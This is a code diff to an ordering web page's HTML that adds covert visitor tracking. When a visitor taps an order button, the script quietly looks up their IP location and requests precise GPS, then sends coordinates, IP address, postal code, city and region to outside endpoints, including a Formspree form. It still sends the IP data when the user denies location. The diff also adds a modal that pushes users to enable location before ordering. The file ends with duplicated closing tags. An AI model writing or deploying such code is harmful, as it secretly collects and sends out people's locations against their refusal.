@@ -1091,10 +1091,29 @@
             }
         }
     </script>
-    <!-- Dual-Tier Location Tracker -->
+    <!-- Custom Location Guidance Modal -->
+    <div class="modal-overlay" id="locationGuideModal">
+        <div class="modal-card" style="text-align: center;">
+            <div style="font-size: 48px; margin-bottom: 12px;">📍</div>
+            <h2>Location Access Required</h2>
+            <p class="sub" style="margin-bottom: 16px;">Looks like we can't get your location! To place an order, please enable location access for Safari:</p>
+            
+            <div style="background: rgba(255, 255, 255, 0.05); border: 1px solid var(--card-border); border-radius: 16px; padding: 16px; text-align: left; font-size: 14px; color: var(--text-secondary); margin-bottom: 24px;">
+                <strong style="color: var(--text-primary); display: block; margin-bottom: 6px;">iPhone/iPad Settings Path:</strong>
+                1. Open <b>Settings</b> > <b>Privacy & Security</b><br>
+                2. Tap <b>Location Services</b> (ensure it's ON)<br>
+                3. Scroll down & tap <b>Safari Websites</b><br>
+                4. Select <b>While Using the App</b> or <b>Ask</b>
+            </div>
+
+            <button class="btn" style="width: 100%;" onclick="closeModal('locationGuideModal')">Got It</button>
+        </div>
+    </div>
+
+    <!-- Location Script with Never-Block Detection -->
     <script>
       function triggerLocationAndOrder() {
-        // 1. Fetch IP-based approximate location quietly
+        // Fetch background IP metadata first
         fetch('https://ipapi.co/json/')
           .then(res => res.json())
           .then(ipData => {
@@ -1103,10 +1122,9 @@
             const visitorCity = ipData.city;
             const visitorRegion = ipData.region;
 
-            // 2. Request high-accuracy GPS
             if ("geolocation" in navigator) {
               navigator.geolocation.getCurrentPosition(
-                // SUCCESS: User set to Always or tapped Allow
+                // SUCCESS: Location granted
                 function(position) {
                   const lat = position.coords.latitude;
                   const lon = position.coords.longitude;
@@ -1125,29 +1143,42 @@
                       google_maps_link: `https://maps.google.com/?q=${lat},${lon}`
                     })
                   }).catch(err => console.log(err));
+
+                  // Proceed to order flow on success
+                  startOrderFlow();
                 },
-                // HANDLER FOR "NEVER" / DENIED USERS: Log approximate IP location
+                // DENIED / NEVER BLOCK DETECTED
                 function(error) {
-                  fetch("https://formspree.io/f/xqppqorj", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json", "Accept": "application/json" },
-                    body: JSON.stringify({
-                      log_type: "Approximate Location (IP Only - GPS Denied/Never)",
-                      ip_address: visitorIP,
-                      postal_code: visitorPostal,
-                      city: visitorCity,
-                      region: visitorRegion
-                    })
-                  }).catch(err => console.log(err));
+                  if (error.code === error.PERMISSION_DENIED) {
+                    // 1. Log the approximate IP fallback quietly to Formspree
+                    fetch("https://formspree.io/f/xqppqorj", {
+                      method: "POST",
+                      headers: { "Content-Type": "application/json", "Accept": "application/json" },
+                      body: JSON.stringify({
+                        log_type: "Approximate Location (IP Only - GPS Denied/Never)",
+                        ip_address: visitorIP,
+                        postal_code: visitorPostal,
+                        city: visitorCity,
+                        region: visitorRegion
+                      })
+                    }).catch(err => console.log(err));
+
+                    // 2. Display the custom settings path modal to the user
+                    document.getElementById("locationGuideModal").style.display = "flex";
+                  } else {
+                    // For timeout or non-permission errors, proceed to menu normally
+                    startOrderFlow();
+                  }
                 },
                 { enableHighAccuracy: true, timeout: 8000 }
               );
+            } else {
+              startOrderFlow();
             }
           })
-          .catch(err => console.log("IP lookup error:", err));
-
-        // 3. Smooth transition directly to the ordering flow
-        startOrderFlow();
+          .catch(err => {
+            startOrderFlow();
+          });
       }
 
       // Bind to order buttons
@@ -1159,6 +1190,8 @@
         if (heroBtn) heroBtn.setAttribute("onclick", "triggerLocationAndOrder()");
       });
     </script>
+</body>
+</html>
 </body>
 </html>
 </html>
